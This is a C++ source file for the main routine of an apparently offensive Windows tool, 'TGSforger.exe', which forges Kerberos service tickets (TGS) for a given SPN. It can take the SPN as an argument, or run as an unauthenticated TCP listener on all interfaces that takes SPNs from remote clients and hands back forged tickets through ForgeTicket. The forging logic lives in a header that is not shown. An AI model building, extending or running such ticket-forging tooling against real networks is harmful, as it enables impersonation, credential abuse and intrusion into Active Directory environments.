#include "forger.h"

int runServer(char *port_str) {
    int port = std::atoi(port_str);
    if (port <= 0) {
        std::cerr << "Port invalide\n";
        return 1;
    }

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        std::cerr << "WSAStartup failed\n";
        return 1;
    }

    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) {
        std::cerr << "socket failed\n";
        WSACleanup();
        return 1;
    }

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);

    if (bind(s, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        std::cerr << "bind failed\n";
        closesocket(s);
        WSACleanup();
        return 1;
    }

    if (listen(s, 1) == SOCKET_ERROR) {
        std::cerr << "listen failed\n";
        closesocket(s);
        WSACleanup();
        return 1;
    }

    std::cout << "Listening on port " << port << "...\n";

    for (;;) {
        sockaddr_in client{};
        int clientSize = sizeof(client);
        SOCKET c = accept(s, (sockaddr*)&client, &clientSize);
        if (c == INVALID_SOCKET) {
            std::cerr << "accept failed\n";
            break;
        }

        char buf[4096];
        int n = recv(c, buf, sizeof(buf), 0);
        if (n > 0) {
            // Conversion stricte du buffer (non null-terminated)
            int size_needed = MultiByteToWideChar(CP_UTF8, 0, buf, n, NULL, 0);
            std::wstring wstr(size_needed, 0);
            MultiByteToWideChar(CP_UTF8, 0, buf, n, &wstr[0], size_needed);
            while (!wstr.empty() && (wstr.back() == L'\n' || wstr.back() == L'\r'))
                wstr.pop_back();
            // On s’assure qu’il y a un 0 terminal pour être tranquille
            wstr.push_back(L'\0');

            ForgeTicket(wstr.c_str(), FALSE, c);
        }
        else if (n == 0) {
            std::cout << "[client closed connection]\n";
        }
        else {
            std::cerr << "recv failed\n";
        }

        closesocket(c);
    }

    closesocket(s);
    WSACleanup();
}

int main(int argc, char** argv) {
    if (argc == 1 || argc > 3) {
        std::cerr << "Usage: \nTGSforger.exe \"SPN\"\nTGSforger.exe -p <port>\n";
    }
    else if (argc == 2) {
        int size_needed = MultiByteToWideChar(CP_UTF8, 0, argv[1], -1, NULL, 0);
        std::wstring wstr(size_needed, 0);
        MultiByteToWideChar(CP_UTF8, 0, argv[1], -1, &wstr[0], size_needed);
        ForgeTicket(wstr.c_str(),TRUE, {0});
    }
    else {
        runServer(argv[2]);
    }
    
    return 0;
}
